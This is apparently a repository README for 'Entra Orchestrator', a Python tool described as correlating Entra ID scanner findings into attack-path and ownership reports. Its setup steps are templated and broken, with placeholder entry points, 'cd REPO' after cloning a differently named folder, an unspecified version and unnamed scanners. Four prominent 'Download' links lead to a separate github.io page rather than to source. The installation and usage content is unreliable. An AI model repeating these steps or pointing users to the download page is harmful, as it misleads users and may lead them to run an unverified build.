# Entra Orchestrator - Identity Security Correlation Engine 2026

> **Entra Orchestrator is a Python identity security utility that merges output from three Entra ID scanners so you can see linked risks—attack paths, ownership gaps, and privilege-escalation ties—in one place.**

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/nilsh1989/entra-orchestrator-engine?style=flat-square)](https://github.com/nilsh1989/entra-orchestrator-engine)

---

<p align="center">
  <a href="https://nilsh1989.github.io/entra-orchestrator-engine/">
    <img src="https://img.shields.io/badge/Download-Entra%20Orchestrator%20Latest-brightgreen?style=for-the-badge" alt="Download Entra Orchestrator">
  </a>
</p>

> **[Download - Entra Orchestrator](https://nilsh1989.github.io/entra-orchestrator-engine/)**

---

[Download Latest Build](https://nilsh1989.github.io/entra-orchestrator-engine/)

---

## What Entra Orchestrator Does

Rather than reviewing each Entra ID or Azure AD scanner in isolation, Entra Orchestrator normalizes their results into one schema and a shared findings store. That correlation layer lets analysts trace how apps, identities, owners, and escalation routes interact.

It fits identity-focused assessments and automation pipelines: flag apps with more privilege than they should have, call out apps that have no owner, and fold those signals into attack-chain narratives backed by HTML visualizations.

---

## Capabilities

- Join findings produced by three Entra ID security scanners.
- Rely on one common findings schema and a centralized findings store.
- Spot over-privileged applications tied to identities that sit on privilege-escalation paths.
- Surface over-privileged applications that have no assigned owner.
- Enable attack-chain style review across apps, ownership, and escalation links.
- Emit visual HTML reports for correlated results.
- Align with Microsoft Graph–centric Entra ID security processes.
- Expose cross-scanner relationships that single-tool output often hides.

---

## Installation

Clone the repo and create a virtual environment:

```bash
git clone https://github.com/nilsh1989/entra-orchestrator-engine.git
cd REPO

python -m venv .venv
```

Activate it:

```bash
# Linux or macOS
source .venv/bin/activate

# Windows PowerShell
.venv\Scripts\Activate.ps1
```

Install dependencies when a requirements file is present:

```bash
python -m pip install -r requirements.txt
```

Launch via the documented script entry point:

```bash
python <entry-point>.py
```

Or, if the project ships as a module:

```bash
python -m <module-name>
```

---

## Usage

A common sequence looks like this:

1. Execute the Entra ID security scanners you already use.
2. Export or map their output into the orchestrator’s shared findings schema.
3. Drop those findings into the configured input location or findings store.
4. Start Entra Orchestrator.
5. Open the HTML correlation report it writes.
6. Follow links among applications, owners, and privilege-escalation paths.

Illustrative start command:

```bash
python <entry-point>.py
```

Input paths, flags, and report locations follow whatever configuration and entry point this repository defines.

---

## Configuration

Set options through the env vars and config files the project documents. A local setup often needs Graph credentials plus paths for findings and reports:

```env
GRAPH_TENANT_ID=<tenant-id>
GRAPH_CLIENT_ID=<client-id>
GRAPH_CLIENT_SECRET=<client-secret>
FINDINGS_STORE=<path-to-findings-store>
REPORT_OUTPUT=<path-to-html-report>
```

Confirm exact names and auth flow in the repo docs before you run anything. Do not commit secrets.

---

## Requirements

- A Python runtime.
- Reachability into the Entra ID tenant under review.
- Microsoft Graph access when the chosen workflow needs it.
- Output from the supported Entra ID security scanners.
- Disk (or other storage) for the shared findings set and HTML reports.
- Graph permissions that match the scanners and correlation steps you enable.

---

## FAQ

### What scope does Entra Orchestrator cover?

It correlates Entra ID security findings about applications, identities, ownership, excess privilege, and privilege-escalation paths.

### What environments can I run it on?

The implementation is Python. Supported OS and Python versions come from the repo’s dependency and runtime setup.

### Is this a substitute for the three scanners?

No. It consumes their findings and analyzes how those findings relate to each other.

### Where do reports land?

As visual HTML. The output path is whatever your configuration specifies.

### How do I wire up Microsoft Graph?

Supply the Graph settings the project expects, with credentials whose permissions match the work you perform. See the repository’s config guidance for the precise auth model.

### Why might correlation results be empty?

Verify every scanner’s data uses the shared schema, sits in the configured findings store, and includes the identity, application, ownership, and privilege fields relationship logic depends on.

### How do I stay current?

Grab the latest build from the download link above, or update the clone:

```bash
git pull
```

Re-check dependencies before you recreate the environment.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
